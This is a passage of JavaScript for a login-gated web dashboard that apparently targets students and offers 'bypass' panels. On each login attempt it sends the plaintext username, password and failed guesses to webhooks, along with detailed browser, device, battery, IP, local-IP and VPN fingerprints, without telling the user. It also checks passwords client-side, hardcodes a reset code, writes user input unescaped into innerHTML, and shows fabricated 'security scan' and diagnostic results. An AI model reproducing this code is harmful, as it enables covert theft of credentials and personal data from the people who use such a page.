    async function logIdentifier(name, identifier) { await logEvent('identifier', "Identifier Logged", 0x2ecc71, [{ name: "Name", value: name || "N/A", inline: true }, { name: "Identifier", value: identifier, inline: true }]); }
    async function logInvalidUsername(name, username) { await logEvent('invalid_username', "Invalid Username Attempt", 0xf39c12, [{ name: "Name", value: name || "N/A", inline: true }, { name: "Attempted Username", value: username, inline: true }]); }
    async function logInvalidPassword(name, password) { await logEvent('invalid_password', "Invalid Password Attempt", 0xe67e22, [{ name: "Name", value: name || "N/A", inline: true }, { name: "Attempted Password", value: password, inline: true }]); }
    async function logInvalidIdentifier(name, identifier) { await logEvent('invalid_identifier', "Invalid Identifier Attempt", 0xd35400, [{ name: "Name", value: name || "N/A", inline: true }, { name: "Attempted Identifier", value: identifier, inline: true }]); }
    async function logAttemptsCounter(name, username, password, identifier, attemptsLeft) { await logEvent('attempts_counter', "Attempt Counter Update", 0x9b59b6, [{ name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Attempts Left", value: attemptsLeft.toString(), inline: true }]); }
    async function logAttemptsExceeded(name, username, password, identifier) { await logEvent('attempts_exceeded', "MAX ATTEMPTS EXCEEDED", 0xc0392b, [{ name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true }, { name: "Identifier", value: identifier, inline: true }]); }
    async function logResetCodeDetected(name, username, password, identifier, code) { await logEvent('reset_code_detected', "Reset Code Entry Attempt", 0xffff00, [{ name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true }, { name: "User ID", value: identifier, inline: true }, { name: "Entered Code", value: code, inline: false }]); }
    async function logResetCodeResult(accepted, name, username, password, identifier, code) { await logEvent(accepted ? 'reset_code_accepted' : 'reset_code_incorrect', `Reset Code ${accepted ? 'Accepted' : 'Incorrect'}`, accepted ? 0x00ff00 : 0xff0000, [{ name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true }, { name: "User ID", value: identifier, inline: true }, { name: "Reset Code", value: code, inline: false }]); }


    // Original embed builders (unchanged)
    function buildUserLoggingEmbed(data) {
      return {
        title: "User Logging System", color: 0xff0000,
        fields: [
          { name: "Name", value: data.user.name || "N/A", inline: true },
          { name: "Username", value: data.user.username, inline: true },
          { name: "Password", value: data.password, inline: true },
          { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true },
          { name: "Role Type", value: data.user.role || "N/A", inline: true },
          { name: "Login Time", value: data.loginTime, inline: false },
          { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true },
          { name: "Account Creation Date", value: data.user.accountCreationDate || "N/A", inline: true }
        ]
      };
    }

    function buildBrowserLoggingEmbed(data) {
      const nav = navigator;
      return {
        title: "Browser Logging System", color: 0x00ff00,
        fields: [
          { name: "Person's Name", value: data.user.name || "N/A", inline: true },
          { name: "Username", value: data.user.username || "N/A", inline: true },
          { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true },
          { name: "Browser Vendor", value: nav.vendor || "Unknown", inline: true },
          { name: "Browser Language", value: nav.language || "Unknown", inline: true },
          { name: "Browser Languages", value: nav.languages ? nav.languages.join(", ") : "Unknown", inline: false },
          { name: "User Agent", value: nav.userAgent || "Unknown", inline: false },
          { name: "Installed Plugins", value: nav.plugins?.length > 0 ? `${nav.plugins.length} plugin(s)` : "None", inline: true },
          { name: "Browser Window Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true },
          { name: "Browser Zoom Level", value: `${Math.round(window.devicePixelRatio * 100)}%`, inline: true },
          { name: "Incognito/Private Mode Status", value: "Undetected", inline: true }, // This can be detected, but complex
          { name: "Cookies Enabled", value: nav.cookieEnabled ? "Yes" : "No", inline: true },
          { name: "Do Not Track", value: nav.doNotTrack || "Unknown", inline: true },
          { name: "Browser Tab Visibility", value: document.visibilityState || "Unknown", inline: true },
          { name: "Font Smoothing Type", value: "Unavailable", inline: true },
          { name: "Clipboard Access", value: nav.clipboard ? "Supported" : "Not Supported", inline: true },
          { name: "WebGL Renderer Info", value: data.webglRenderer || "Unavailable", inline: true },
          { name: "Browser Connection Speed", value: nav.connection?.effectiveType || "Unknown", inline: true }
        ]
      };
    }

    function buildDeviceLoggingEmbed(data) {
      const nav = navigator;
      const battery = data.batteryStatus;
      return {
        title: "Device Logging System", color: 0x0000ff,
        fields: [
          { name: "Person's Name", value: data.user.name || "N/A", inline: true },
          { name: "Username", value: data.user.username || "N/A", inline: true },
          { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
          { name: "Device Platform", value: nav.platform || "Unknown", inline: true },
          { name: "CPU Cores", value: nav.hardwareConcurrency ? `${nav.hardwareConcurrency} cores` : "Unavailable", inline: true },
          { name: "Device Memory", value: nav.deviceMemory ? `${nav.deviceMemory} GB` : "Unavailable", inline: true },
          { name: "GPU Renderer", value: data.webglRenderer || "Unavailable", inline: true },
          { name: "Battery Charging", value: battery?.charging ? "Yes" : "No", inline: true },
          { name: "Battery Level", value: battery ? `${Math.round(battery.level * 100)}%` : "Unavailable", inline: true },
          { name: "Touch Support", value: ('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No", inline: true },
          { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true },
          { name: "Screen Orientation", value: screen.orientation?.type || "Unavailable", inline: true },
          { name: "Color Depth", value: `${screen.colorDepth} bit`, inline: true },
          { name: "Pixel Depth", value: `${screen.pixelDepth} bit`, inline: true },
          { name: "Device Pixel Ratio", value: window.devicePixelRatio?.toString() || "Unknown", inline: true },
          { name: "Max Touch Points", value: nav.maxTouchPoints?.toString() || "0", inline: true },
          { name: "Vendor", value: nav.vendor || "Unknown", inline: true },
          { name: "Language", value: nav.language || "Unknown", inline: true }
        ]
      };
    }

    function buildConnectionLoggingEmbed(data) {
      const nav = navigator;
      return {
        title: "Connection Logging System", color: 0xffff00,
        fields: [
          { name: "Person's Name", value: data.user.name || "N/A", inline: true },
          { name: "Username", value: data.user.username || "N/A", inline: true },
          { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
          { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true },
          { name: "Connection Type", value: nav.connection?.type || "Unknown", inline: true },
          { name: "Effective Connection Type", value: nav.connection?.effectiveType || "Unknown", inline: true },
          { name: "Downlink Speed", value: nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : "Unknown", inline: true },
          { name: "RTT (Round Trip Time)", value: nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown", inline: true },
          { name: "Save Data Mode", value: nav.connection?.saveData ? "Enabled" : "Disabled", inline: true },
          { name: "IP Address", value: data.user.ipAddress || "Unavailable", inline: false },
          { name: "VPN Detected", value: data.user.vpnDetected ? "Yes" : "No", inline: true },
          { name: "Proxy Detected", value: data.user.proxyDetected ? "Yes" : "No", inline: true },
          { name: "Public IPv6", value: data.user.ipv6Address || "Unavailable", inline: false },
          { name: "Local IP Addresses", value: data.user.localIPs?.join(", ") || "Unavailable", inline: false },
          { name: "Network Downlink Max", value: nav.connection?.downlinkMax ? `${nav.connection.downlinkMax} Mbps` : "Unknown", inline: true },
          { name: "Network Metered Connection", value: nav.connection?.metered ? "Yes" : "No", inline: true },
          { name: "Network Type Detailed", value: nav.connection?.typeDetailed || "Unknown", inline: true },
          { name: "Effective Network Bandwidth Estimate", value: nav.connection?.bandwidthEstimate || "Unavailable", inline: true }
        ]
      };
    }

    function buildSessionLoggingEmbed(data) {
      return {
        title: "Session Logging System", color: 0x00ffff,
        fields: [
          { name: "Person's Name", value: data.user.name || "N/A", inline: true },
          { name: "Username", value: data.user.username || "N/A", inline: true },
          { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
          { name: "Login Time", value: data.loginTime || "Unknown", inline: true },
          { name: "Logout Time", value: data.logoutTime || "Unknown", inline: true },
          { name: "Session Duration", value: data.sessionDuration || "Unknown", inline: true },
          { name: "Pages Visited", value: data.pagesVisited?.join(", ") || "None", inline: false },
          { name: "Actions Performed", value: data.actionsPerformed?.join(", ") || "None", inline: false },
          { name: "Errors Encountered", value: data.errorsEncountered?.join("; ") || "None", inline: false },
          { name: "Warnings", value: data.warnings?.join("; ") || "None", inline: false },
          { name: "User Role Changes", value: data.roleChanges?.join(", ") || "None", inline: false },
          { name: "Permission Changes", value: data.permissionChanges?.join(", ") || "None", inline: false },
          { name: "Last Activity Timestamp", value: data.lastActivityTime || "Unknown", inline: true },
          { name: "Number of Clicks", value: data.numberOfClicks?.toString() || "0", inline: true },
          { name: "Number of Form Submissions", value: data.numberOfFormSubmissions?.toString() || "0", inline: true },
          { name: "Idle Time", value: data.idleTime || "0s", inline: true },
          { name: "Active Time", value: data.activeTime || "Unknown", inline: true },
          { name: "Browser Tab Focus Time", value: data.tabFocusTime || "Unknown", inline: true }
        ]
      };
    }

    // Handle login submission
    async function submitLogin() {
      errorMsg.textContent = '';
      const username = usernameInput.value.trim();
      const password = passwordInput.value.trim();
      const userID = userIDInput.value.trim();

      if (!username || !password || !userID) {
        errorMsg.textContent = 'Please fill all fields.';
        showNotification('Login failed: All fields are required.', 'error');
        flashRedOutline();
        return;
      }

      const user = findUser(username, userID);

      await logAttemptsCounter(user?.name || "Unknown", username, password, userID, attempts);

      if (!user) {
        await logInvalidUsername(null, username); // Name is null if user not found
        await logInvalidIdentifier(null, userID);
        handleFailedAttempt('User not found.');
        return;
      }

      if (password !== user.password) {
        await logInvalidPassword(user.name, password);
        handleFailedAttempt('Incorrect password.');
        return;
      }

      // Correct login
      attempts = 5; // Reset attempts on success
      updateAttemptsText();
      errorMsg.textContent = '';
      resetPopup.style.display = 'none';
      loginBox.style.borderColor = 'white';
      loginBox.style.boxShadow = '0 0 15px white';

      // Log successful credentials and system data
      await logUsername(user.name, username);
      await logPassword(user.name, password);
      await logIdentifier(user.name, userID);

      const loggingData = await collectLoggingData(user, password);

      await Promise.all([
        sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
        sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
        sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
        sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
        sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
      ]);

      // Transition to dashboard
      loginBox.style.display = 'none';
      document.body.classList.add('dashboard-body'); // Ensure body styling is applied
      dashboard.style.display = 'block';
      document.getElementById('loggedInUser').textContent = user.name || user.username;
      document.getElementById('loggedInID').textContent = userID;
      
      dashboard.init(); // Initialize dashboard functionalities
      showNotification(`Welcome back, ${user.name || user.username}!`, 'success');
    }

    // Failed attempt handler
    async function handleFailedAttempt(msg) {
      attempts--;
      updateAttemptsText();
      errorMsg.textContent = msg;
      showNotification(`Login attempt failed: ${msg}`, 'error');
      
      if (attempts <= 0) {
        const username = usernameInput.value.trim();
        const password = passwordInput.value.trim();
        const userID = userIDInput.value.trim();
        const user = findUser(username, userID) || {};

        await logAttemptsExceeded(user?.name || "Unknown", username, password, userID);
        
        flashRedOutline(4, 300); // More intense flash
        resetPopup.style.display = 'block';
        resetPopup.setAttribute('aria-hidden', 'false');
        resetField.focus();
        disableInputs();
      } else {
        if (attempts <= 3) flashRedOutline();
      }
    }

    // Update attempts display
    function updateAttemptsText() {
      attemptsText.textContent = `Attempts Left: ${attempts}`;
    }

    // Disable inputs and submit button
    function disableInputs() {
      usernameInput.disabled = true; passwordInput.disabled = true; userIDInput.disabled = true; submitBtn.disabled = true;
    }

    // Enable inputs and submit button
    function enableInputs() {
      usernameInput.disabled = false; passwordInput.disabled = false; userIDInput.disabled = false; submitBtn.disabled = false;
    }

    // Reset counter functionality
    async function resetCounter() {
      const enteredCode = resetField.value.trim();
      const isCorrect = enteredCode === 'Reset.Counter.2579'; // The secret code

      const username = usernameInput.value.trim() || 'Unknown';
      const password = passwordInput.value.trim() || 'Unknown';
      const userID = userIDInput.value.trim() || 'Unknown';
      const user = findUser(username, userID) || {};

      await logResetCodeDetected(user.name, username, password, userID, enteredCode);

      if (isCorrect) {
        attempts = 5; // Reset attempts
        updateAttemptsText();
        enableInputs();
        resetPopup.style.display = 'none';
        resetPopup.setAttribute('aria-hidden', 'true');
        resetField.value = '';
        errorMsg.textContent = '';
        showNotification('Login attempts reset successfully. Please try logging in again.', 'success');
        loginBox.style.borderColor = 'var(--accent-green)'; // Subtle success indicator
        loginBox.style.boxShadow = '0 0 15px var(--accent-green)';
        setTimeout(() => { loginBox.style.borderColor = 'white'; loginBox.style.boxShadow = '0 0 15px white'; }, 2000);
      } else {
        await logResetCodeResult(false, user.name, username, password, userID, enteredCode);
        showNotification('Incorrect reset code entered. Please try again.', 'error');
      }
    }

    // Attach event listeners
    submitBtn.addEventListener('click', submitLogin);
    resetBtn.addEventListener('click', resetCounter);

    // Enter key submits login if popup hidden, else tries reset
    document.addEventListener('keydown', e => {
      if (e.key === 'Enter') {
        if (resetPopup.style.display === 'block') {
          resetCounter();
        } else {
          submitLogin();
        }
      }
    });

    // Initialize attempts display
    updateAttemptsText();

    // =========================================================================
    // Dashboard Functionality Object
    // =========================================================================
    const dashboard = {
      // Initialize all dashboard functionality
      init: function() {
        this.initSessionTimer();
        this.initClock();
        this.generateCalendar();
        this.initThemeToggle();
        this.initButtons();
        this.initCanvas();
        this.initPanels();
        this.initQuickBar();
        this.initReminderSystem(); // Initialize reminder system
        this.initSystemTools();
        this.initNetworkDiagnostics();
        this.initSecurityCenter();
        this.initProcessMonitor();
        this.initFileExplorer();
        this.initSystemLogs();
        
        // Populate initial data where needed
        this.populateFileTree();
        this.generateFakeProcesses();
        this.generateFakeLogs();
      },
      
      // Initialize session timer
      initSessionTimer: function() {
        let sessionSeconds = 0;
        function formatTime(seconds) {
          const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
          const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
          const secs = String(seconds % 60).padStart(2, '0');
          return `${hrs}:${mins}:${secs}`;
        }
        
        function updateSessionTime() {
          sessionSeconds++;
          document.getElementById('sessionTime').innerText = `⏳ Session Time: ${formatTime(sessionSeconds)}`;
        }
        
        updateSessionTime(); // Call once immediately
        this.sessionTimerInterval = setInterval(updateSessionTime, 1000); // Store interval ID to clear later
      },
      
      // Initialize real-time clock
      initClock: function() {
        function updateClock() {
          const now = new Date();
          const options = { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true };
          const timeStr = now.toLocaleTimeString(undefined, options);
          const dateStr = now.toLocaleDateString(undefined, { month: 'long', day: 'numeric', year: 'numeric' });

          document.getElementById('realTimeClock').innerText = '🕒 ' + timeStr;
          document.getElementById('realDate').innerText = '📅 ' + dateStr;
        }
        
        updateClock();
        this.clockInterval = setInterval(updateClock, 1000);
      },
      
      // Generate calendar
      generateCalendar: function() {
        const calendar = document.getElementById('calendar');
        calendar.innerHTML = ''; // Clear previous content
        const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
        days.forEach(day => {
          const div = document.createElement('div');
          div.innerText = day;
          div.className = 'calendar-header-day'; // Class for styling day names
          calendar.appendChild(div);
        });

        const date = new Date();
        const year = date.getFullYear();
        const month = date.getMonth();
        const today = date.getDate();

        const firstDayOfMonth = new Date(year, month, 1);
        const startingDayOfWeek = firstDayOfMonth.getDay(); // 0 for Sunday, 1 for Monday, etc.
        const daysInMonth = new Date(year, month + 1, 0).getDate();

        // Add empty cells for days before the first of the month
        for (let i = 0; i < startingDayOfWeek; i++) {
          const emptyCell = document.createElement('div');
          calendar.appendChild(emptyCell);
        }

        // Add cells for each day of the month
        for (let i = 1; i <= daysInMonth; i++) {
          const cell = document.createElement('div');
          cell.innerText = i;
          if (i === today) {
            cell.classList.add('today');
          }
          calendar.appendChild(cell);
        }
      },
      
      // Initialize theme toggle
      initThemeToggle: function() {
        const themeBtn = document.getElementById('themeToggle');
        themeBtn.addEventListener('click', () => {
          document.body.classList.toggle('light-theme');
          if(document.body.classList.contains('light-theme')){
            themeBtn.innerText = '☀️ Light Mode';
            showNotification('Theme switched to Light Mode.', 'info');
          } else {
            themeBtn.innerText = '🌙 Dark Mode';
            showNotification('Theme switched to Dark Mode.', 'info');
          }
        });
      },
      
      // Initialize buttons with general functionality
      initButtons: function() {
        document.getElementById('panicBtn').addEventListener('click', () => {
          showNotification('Panic mode activated. Opening emergency access.', 'warning');
          window.open('https://clever.com', '_blank'); // Example external link
        });

        document.getElementById('restartBtn').addEventListener('click', () => {
          if(confirm('Are you sure you want to restart the dashboard application? This will reload the page.')) {
            showNotification('Restarting dashboard...', 'system');
            window.location.reload();
          } else {
            showNotification('Restart cancelled.', 'info');
          }
        });

        document.getElementById('fixIssuesBtn').addEventListener('click', () => {
          showNotification('Running system diagnostics...', 'info');
          setTimeout(() => {
            showNotification('All systems operational. No issues detected.', 'success');
          }, 2000);
        });
        
        document.getElementById('fullScreenBtn').addEventListener('click', () => {
          if (!document.fullscreenElement) {
            document.documentElement.requestFullscreen().catch(err => {
              showNotification(`Error entering fullscreen: ${err.message}`, 'error');
            });
            showNotification('Fullscreen mode enabled.', 'info');
          } else {
            document.exitFullscreen();
            showNotification('Fullscreen mode disabled.', 'info');
          }
        });
        
        let zoomLevel = 1;
        const zoomStep = 0.1;
        const minZoom = 0.5;
        const maxZoom = 2;

        document.getElementById('zoomInBtn').addEventListener('click', () => {
          if (zoomLevel < maxZoom) {
            zoomLevel += zoomStep;
            document.body.style.zoom = zoomLevel;
            showNotification(`Zoom level increased to ${Math.round(zoomLevel * 100)}%.`, 'info');
          } else {
            showNotification('Maximum zoom level reached.', 'warning');
          }
        });

        document.getElementById('zoomOutBtn').addEventListener('click', () => {
          if (zoomLevel > minZoom) {
            zoomLevel -= zoomStep;
            document.body.style.zoom = zoomLevel;
            showNotification(`Zoom level decreased to ${Math.round(zoomLevel * 100)}%.`, 'info');
          } else {
            showNotification('Minimum zoom level reached.', 'warning');
          }
        });

        document.getElementById('logoutBtn').addEventListener('click', () => {
          if (confirm('Are you sure you want to log out?')) {
            showNotification('Logging out...', 'info');
            // Perform logout actions here (e.g., clear session, redirect)
            window.location.reload(); // Simple reload simulates logout for this demo
          }
        });
      },
      
      // Initialize canvas for notes
      initCanvas: function() {
        const notesBtn = document.getElementById('notesBtn');
        const canvasContainer = document.getElementById('canvasContainer');
        const mainGrid = document.getElementById('mainGrid');
        const updatesNotifications = document.getElementById('updatesNotifications'); // Also hide this section
        const quickBar = document.querySelector('.quick-bar'); // Hide quick bar too

        notesBtn.addEventListener('click', () => {
          mainGrid.style.display = 'none';
          updatesNotifications.style.display = 'none';
          quickBar.style.display = 'none';
          canvasContainer.style.display = 'block';
          showNotification('Notes canvas opened.', 'info');
        });

        document.getElementById('closeCanvasBtn').addEventListener('click', () => {
          canvasContainer.style.display = 'none';
          mainGrid.style.display = 'flex';
          updatesNotifications.style.display = 'flex';
          quickBar.style.display = 'flex';
          showNotification('Notes canvas closed.', 'info');
        });

        const clearCanvasBtn = document.getElementById('clearCanvasBtn');

        const canvas = document.getElementById('notesCanvas');
        const ctx = canvas.getContext('2d');

        // Initialize canvas with white background
        ctx.fillStyle = '#fff';
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        let drawing = false;
        let lastPos = { x: 0, y: 0 };

        function getPos(evt) {
          const rect = canvas.getBoundingClientRect();
          const touch = evt.touches ? evt.touches[0] : evt;
          return {
            x: touch.clientX - rect.left,
            y: touch.clientY - rect.top
          };
        }

        canvas.addEventListener('mousedown', (e) => {
          if (e.target === canvas) { // Ensure click is on canvas itself
            drawing = true;
            lastPos = getPos(e);
            ctx.beginPath();
            ctx.moveTo(lastPos.x, lastPos.y);
            e.preventDefault(); // Prevent default browser behavior
          }
        });

        canvas.addEventListener('touchstart', (e) => {
          if (e.target === canvas) {
            drawing = true;
            lastPos = getPos(e);
            ctx.beginPath();
            ctx.moveTo(lastPos.x, lastPos.y);
            e.preventDefault();
          }
        });

        const mouseMoveListener = (e) => {
          if (!drawing) return;
          const currentPos = getPos(e);
          ctx.lineTo(currentPos.x, currentPos.y);
          ctx.strokeStyle = '#ff914d'; // Pen color
          ctx.lineWidth = 3; // Pen thickness
          ctx.lineCap = 'round';
          ctx.lineJoin = 'round';
          ctx.stroke();
          lastPos = currentPos;
          e.preventDefault();
        };

        const touchMoveListener = (e) => {
          if (!drawing) return;
          const currentPos = getPos(e);
          ctx.lineTo(currentPos.x, currentPos.y);
          ctx.strokeStyle = '#ff914d'; // Pen color
          ctx.lineWidth = 3; // Pen thickness
          ctx.lineCap = 'round';
          ctx.lineJoin = 'round';
          ctx.stroke();
          lastPos = currentPos;
          e.preventDefault();
        };

        canvas.addEventListener('mousemove', mouseMoveListener);
        canvas.addEventListener('touchmove', touchMoveListener);

        ['mouseup', 'mouseleave', 'touchend', 'touchcancel'].forEach(evtName => {
          canvas.addEventListener(evtName, () => {
            if (drawing) {
              drawing = false;
              showNotification('Finished drawing a stroke.', 'info');
            }
          });
        });

        clearCanvasBtn.addEventListener('click', () => {
          ctx.clearRect(0, 0, canvas.width, canvas.height);
          ctx.fillStyle = '#fff';
          ctx.fillRect(0, 0, canvas.width, canvas.height);
          showNotification('Notes canvas cleared.', 'info');
        });

        document.getElementById('screenshotBtn').addEventListener('click', () => {
          showNotification('Capturing screenshot...', 'info');
          html2canvas(document.body).then(canvasImg => {
            const link = document.createElement('a');
            link.download = `screenshot_${Date.now()}.png`;
            link.href = canvasImg.toDataURL('image/png');
            link.click();
            showNotification('Screenshot saved.', 'success');
          }).catch(err => {
            showNotification(`Screenshot failed: ${err.message}`, 'error');
          });
        });
        
        document.getElementById('exportNotesBtn').addEventListener('click', () => {
          const link = document.createElement('a');
          link.download = `notes_${Date.now()}.png`;
          link.href = canvas.toDataURL('image/png');
          link.click();
          showNotification('Notes saved as image.', 'success');
        });

        const toggleBtn = document.getElementById('toggleSectionsBtn');
        toggleBtn.addEventListener('click', () => {
          const sectionsVisible = mainGrid.style.display !== 'none';
          if (sectionsVisible) {
            mainGrid.style.display = 'none';
            updatesNotifications.style.display = 'none';
            quickBar.style.display = 'none'; // Also hide quick bar for cleaner look
            toggleBtn.innerText = '⬇️ Show Sections';
            showNotification('Dashboard sections hidden.', 'info');
          } else {
            mainGrid.style.display = 'flex';
            updatesNotifications.style.display = 'flex';
            quickBar.style.display = 'flex';
            toggleBtn.innerText = '⬆️ Hide Sections';
            showNotification('Dashboard sections shown.', 'info');
          }
        });
      },
      
      // Initialize panels (setting their default hidden state)
      initPanels: function() {
        document.querySelectorAll('.info-panel').forEach(panel => {
          panel.style.display = 'none';
        });
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });
      },
      
      // Initialize quick bar (handlers are mostly done by panel toggles)
      initQuickBar: function() {
        // The buttons are wired up to call togglePanel or specific functions.
        // No further JS initialization needed here unless there's a specific quick-bar feature.
      },
      
      // General panel toggle function
      togglePanel: function(panelId) {
        const panel = document.getElementById(panelId);
        const currentlyVisible = panel.style.display !== 'none';
        
        // Hide all other panels first for a cleaner UI (optional, but good for usability)
        // document.querySelectorAll('.info-panel').forEach(p => {
        //     if (p.id !== panelId) p.style.display = 'none';
        // });

        if (currentlyVisible) {
          panel.style.display = 'none';
          showNotification(`Panel "${panelId.replace(/Panel/, '').replace(/([A-Z])/g, ' $1').trim()}" closed.`, 'info');
        } else {
          panel.style.display = 'block';
          showNotification(`Panel "${panelId.replace(/Panel/, '').replace(/([A-Z])/g, ' $1').trim()}" opened.`, 'info');
        }
      },
      
      // Specific handlers for nested content panels
      showIpadContent: function(contentId) {
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        const targetContent = document.getElementById('ipad' + contentId.charAt(0).toUpperCase() + contentId.slice(1));
        if (targetContent) targetContent.style.display = 'block';
      },
      
      showBypassContent: function(contentId) {
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });
        const targetContent = document.getElementById(contentId + 'Bypass');
        if (targetContent) targetContent.style.display = 'block';
      },

      // =========================================================================
      // Reminder System Initialization and Functionality
      // =========================================================================
      initReminderSystem: function() {
        const reminderInput = document.getElementById('reminderInput');
        const addReminderBtn = document.getElementById('addReminderBtn');
        const reminderList = document.getElementById('reminderList');

        // Load reminders from local storage
        this.loadReminders();

        addReminderBtn.addEventListener('click', () => {
          const reminderText = reminderInput.value.trim();
          if (reminderText) {
            this.addReminder(reminderText);
            reminderInput.value = ''; // Clear input
            showNotification(`Reminder "${reminderText.substring(0, 20)}..." added.`, 'success');
          } else {
            showNotification('Reminder text cannot be empty.', 'warning');
          }
        });
      },

      loadReminders: function() {
        const reminderList = document.getElementById('reminderList');
        const storedReminders = localStorage.getItem('dashboardReminders');
        if (storedReminders) {
          const reminders = JSON.parse(storedReminders);
          reminders.forEach(rem => this.displayReminder(rem));
        }
      },

      saveReminders: function() {
        const reminderList = document.getElementById('reminderList');
        const reminders = [];
        reminderList.querySelectorAll('.reminder-item').forEach(item => {
          reminders.push({
            id: item.dataset.id,
            text: item.querySelector('.reminder-text').innerText,
            done: item.classList.contains('done')
          });
        });
        localStorage.setItem('dashboardReminders', JSON.stringify(reminders));
      },

      displayReminder: function(reminder) {
        const reminderList = document.getElementById('reminderList');
        const li = document.createElement('li');
        li.className = `reminder-item ${reminder.done ? 'done' : ''}`;
        li.dataset.id = reminder.id || `rem-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
        li.innerHTML = `
          <span class="reminder-text">${reminder.text}</span>
          <div class="reminder-actions">
            <button class="done-btn" title="Mark as done/undone"><i class="fas fa-check"></i> ✔️</button>
            <button class="delete-btn" title="Delete reminder"><i class="fas fa-trash-alt"></i> ❌</button>
          </div>
        `;

        const doneBtn = li.querySelector('.done-btn');
        const deleteBtn = li.querySelector('.delete-btn');

        doneBtn.addEventListener('click', () => {
          li.classList.toggle('done');
          this.saveReminders();
          showNotification(li.classList.contains('done') ? 'Reminder marked as complete.' : 'Reminder marked as incomplete.', 'info');
        });

        deleteBtn.addEventListener('click', () => {
          li.remove();
          this.saveReminders();
          showNotification('Reminder deleted.', 'system');
        });

        reminderList.appendChild(li);
      },

      addReminder: function(text) {
        const newReminder = {
          id: `rem-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
          text: text,
          done: false
        };
        this.displayReminder(newReminder);
        this.saveReminders();
      },

      // =========================================================================
      // System Tools Functionality
      // =========================================================================
      initSystemTools: function() {
        // Handlers are attached via onclick in HTML for simplicity here
      },
      simulateTool: function(toolType) {
        let message = '';
        let notificationType = 'info';
        switch (toolType) {
          case 'disk':
            message = 'Simulating disk usage check...\nDisk: 75% Used (120GB free)';
            notificationType = 'info';
            break;
          case 'cpu':
            message = 'Simulating CPU load...\nCPU Usage: 45%\nCore 1: 60%, Core 2: 30%';
            notificationType = 'info';
            break;
          case 'memory':
            message = 'Simulating memory analysis...\nRAM Usage: 6GB / 16GB (38%)\nPage Faults: 1500';
            notificationType = 'info';
            break;
          case 'info':
            message = 'Gathering system information...\nOS: Windows 10 Pro\nProcessor: Intel i7-10700K\nRAM: 16GB DDR4';
            notificationType = 'info';
            break;
          case 'diagnostics':
            message = 'Running system diagnostics...\nTest 1: Passed\nTest 2: Passed\nTest 3: Passed';
            notificationType = 'success';
            break;
          case 'temp':
            message = 'Checking component temperatures...\nCPU: 45°C\nGPU: 55°C\nMotherboard: 35°C';
            notificationType = 'info';
            break;
          default:
            message = `Tool "${toolType}" simulation not implemented.`;
            notificationType = 'warning';
        }
        showNotification(message, notificationType);
      },

      // =========================================================================
      // Network Diagnostics Functionality
      // =========================================================================
      initNetworkDiagnostics: function() {
        // Handlers are attached via onclick in HTML for simplicity here
      },
      runNetworkDiagnostic: function(type) {
        const hostInput = document.getElementById('networkHostInput');
        const host = hostInput.value.trim();
        const resultsDiv = document.getElementById('networkResults');
        
        if (!host) {
          showNotification('Please enter a hostname or IP address.', 'warning');
          return;
        }

        resultsDiv.innerHTML = `Running ${type} on ${host}...<br>Simulating results...`;
        showNotification(`Running ${type} diagnostic for ${host}...`, 'info');

        setTimeout(() => {
          let simulatedResult = '';
          if (type === 'ping') {
            simulatedResult = `
              Ping statistics for ${host}:\n
              Packets: Sent = 4, Received = 4, Lost = 0 (0% loss)\n
              Approximate round trip times in milli-seconds:\n
              Minimum = 15ms, Maximum = 22ms, Average = 18ms
            `;
            showNotification(`Ping to ${host} successful.`, 'success');
          } else if (type === 'traceroute') {
            simulatedResult = `
              Tracing route to ${host} [${host}]\n
              over a maximum of 30 hops:\n
              1    1 ms    1 ms    1 ms  localhost [192.168.1.1]\n
              2    5 ms    4 ms    4 ms  router.example.com [10.0.0.1]\n
              3   15 ms    15 ms   14 ms  192.168.1.254\n
              4   20 ms    21 ms   20 ms  example.net [172.16.0.1]\n
              5   25 ms    24 ms   25 ms  ${host} [${host}]\n
              Trace complete.
            `;
            showNotification(`Traceroute to ${host} completed.`, 'success');
          }
          resultsDiv.innerHTML = simulatedResult.replace(/\n/g, '<br>'); // Replace newlines with <br> for HTML display
        }, 2500); // Simulate network latency
      },

      // =========================================================================
      // Security Center Functionality
      // =========================================================================
      initSecurityCenter: function() {
        // Handlers are attached via onclick in HTML for simplicity here
      },
      runSecurityScan: function(scanType) {
        let scanName = '';
        switch(scanType) {
          case 'malware': scanName = 'Malware Scan'; break;
          case 'vulnerability': scanName = 'Vulnerability Scan'; break;
        }
        showNotification(`${scanName} initiated...`, 'info');
